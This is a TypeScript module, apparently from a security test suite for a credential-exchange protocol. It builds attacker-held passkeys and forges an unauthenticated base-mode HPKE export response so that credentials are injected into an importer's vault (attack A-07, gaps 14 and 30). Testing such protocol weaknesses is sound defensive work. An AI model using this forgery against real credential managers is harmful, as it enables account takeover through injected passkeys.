/**
 * A-07 / GAP-14, GAP-30: an unauthenticated adversary forges a base-mode
 * Export Response to inject credentials into the importer's vault.
 */
import { generateKeyPairSync, randomBytes } from "node:crypto";
import { encodeB64url, type Account, type Header, type Item, type Passkey } from "../cxf/index.js";
import { createExportResponse } from "../cxp/response.js";
import type { ExportRequest, ExportResponse } from "../cxp/schema.js";
import { getPolicy } from "../policy/index.js";

export function createMaliciousPasskey(
  rpId: string,
  username: string,
  overrides?: { credentialId?: string; userHandle?: string },
): Passkey {
  const keyPair = generateKeyPairSync("ec", { namedCurve: "prime256v1" });
  return {
    type: "passkey",
    credentialId: overrides?.credentialId ?? encodeB64url(randomBytes(32)),
    rpId,
    username,
    userDisplayName: `Injected ${username}`,
    userHandle: overrides?.userHandle ?? encodeB64url(randomBytes(32)),
    key: encodeB64url(new Uint8Array(keyPair.privateKey.export({ format: "der", type: "pkcs8" }))),
  };
}

export async function forgeResponse(
  request: ExportRequest,
  passkeys: Passkey[],
  exporter = "adversary.example",
): Promise<ExportResponse> {
  const items: Item[] = passkeys.map((pk) => ({
    id: encodeB64url(randomBytes(16)),
    creationAt: Math.floor(Date.now() / 1000),
    title: pk.rpId,
    subtitle: pk.username,
    credentials: [pk],
  }));

  const account: Account = {
    id: encodeB64url(randomBytes(16)),
    username: "adversary",
    email: "adversary@example.test",
    collections: [],
    items,
  };

  const header: Header = {
    version: { major: 1, minor: 0 },
    exporterRpId: exporter,
    exporterDisplayName: "Adversary",
    timestamp: Math.floor(Date.now() / 1000),
    accounts: [account],
  };

  // GAP-14: force base mode — the adversary has no authenticated sender key.
  const baseRequest: ExportRequest = {
    ...request,
    hpke: request.hpke.map((entry) => ({ ...entry, mode: "base" })),
  };

  return createExportResponse({
    request: baseRequest,
    header,
    exporter,
    policy: getPolicy("spec-minimal"),
  });
}
